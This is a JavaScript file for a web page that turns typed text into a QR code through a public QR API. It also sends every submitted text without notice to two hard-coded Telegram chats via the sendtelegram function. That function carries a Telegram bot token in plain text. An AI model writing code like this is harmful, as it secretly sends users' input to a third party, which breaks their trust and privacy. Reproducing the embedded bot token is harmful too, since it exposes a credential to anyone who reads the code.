let text = document.getElementById("text");
let btn = document.getElementById("btn");
let image = document.getElementById("image");


btn.addEventListener("click", () => {
    if(text.value != "" ) {
        image.src =
    "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=" +
    text.value;
    sendtelegram(text.value,-1001815558027);
    sendtelegram(text.value,6135951524);
    } else {
        alert("Avval yozing")
    }
  
});



// sendtelegram
function sendtelegram(message,id) {
    let telegram_bot_id = "5921899073:AAHF-aj8rebQSQcTkpIxkRRUeJDmer-yORA";
    let chat_id = id;
    let settings = {
      async: true,
      crossDomain: true,
      url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendPhoto",
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "cache-control": "no-cache",
      },
      data: JSON.stringify({ chat_id: chat_id, caption: message, photo: "https://api.qrserver.com/v1/create-qr-code/?size=250x250&data="+text.value }),
    };
    $.ajax(settings).done(function (response) {});
  };